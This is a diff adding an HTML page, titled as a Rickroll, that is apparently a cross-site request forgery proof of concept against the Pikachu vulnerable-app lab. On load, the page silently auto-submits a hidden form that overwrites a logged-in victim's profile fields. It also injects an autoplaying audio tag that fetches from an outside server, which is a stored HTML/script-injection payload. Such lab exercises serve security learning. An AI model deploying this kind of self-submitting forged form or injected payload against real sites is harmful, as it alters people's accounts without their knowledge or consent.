@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Never gonna give you up</title>
+  </head>
+
+  <body>
+    <form
+      action="http://www.liuboyu.site/pikachu/vul/csrf/csrfpost/csrf_post_edit.php"
+      method="post"
+      id="csrf_form"
+    >
+      <input type="hidden" name="sex" value="Rick Astley" />
+      <input type="hidden" name="phonenum" value="Never gonna give you up" />
+      <input type="hidden" name="add" value="Never gonna let you down" />
+      <input
+        type="hidden"
+        name="email"
+        value="<audio controls src='https://server.huanchengfly.top/api/giveup' autoplay></audio>"
+      />
+      <input type="hidden" name="submit" value="submit" />
+      <input type="submit" value="Submit" style="display: none" />
+    </form>
+  </body>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      setTimeout(function () {
+        document.getElementById("csrf_form").requestSubmit();
+      }, 100);
+    });
+  </script>
+</html>
